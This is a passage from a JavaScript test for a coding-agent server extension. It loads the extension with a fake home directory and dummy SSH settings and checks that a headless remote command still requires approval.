	const fakeHome = mkdtempSync(join(tmpdir(), "pifakehome-noauto-"));
	process.env.HOME = fakeHome;
	const piLib = "/usr/local/lib/node_modules/@earendil-works/pi-coding-agent/node_modules";
	const coreAbs = new URL("file://" + join(process.cwd(), ".pi/extensions/server/core.mjs")).href;
	let src = readFileSync(join(process.cwd(), ".pi/extensions/server/index.ts"), "utf8");
	src = src.replace('"@earendil-works/pi-ai"', JSON.stringify(piLib + "/@earendil-works/pi-ai/dist/index.js"));
	src = src.replace('"typebox"', JSON.stringify(piLib + "/typebox/build/index.mjs"));
	src = src.replace('"./core.mjs"', JSON.stringify(coreAbs));
	const probe = join(tmpdir(), `server-index-probe-noauto-${Date.now()}.mts`);
	writeFileSync(probe, src, { mode: 0o600 });
	const mod = await import(pathToFileURL(probe).href);
	const tools = {};
	mod.default({ registerTool: (t) => { tools[t.name] = t; }, registerCommand: () => {} });
	const cfgDir = join(fakeHome, ".pi", "agent");
	mkdirSync(cfgDir, { recursive: true });
	writeFileSync(join(cfgDir, "server-ssh.json"), JSON.stringify({ user: "u", host: "h" }), { mode: 0o600 });
	// Valid command stays gated headless: no approval consumed, no SSH attempted.
	const r = await tools.server.execute("b1", { action: "server_exec", command: "echo hi" }, undefined, () => {}, { hasUI: false, ui: {} });
	equal(r.details.status, "approval_required", `default must keep approval gate, got ${JSON.stringify(r.details)}`);
});
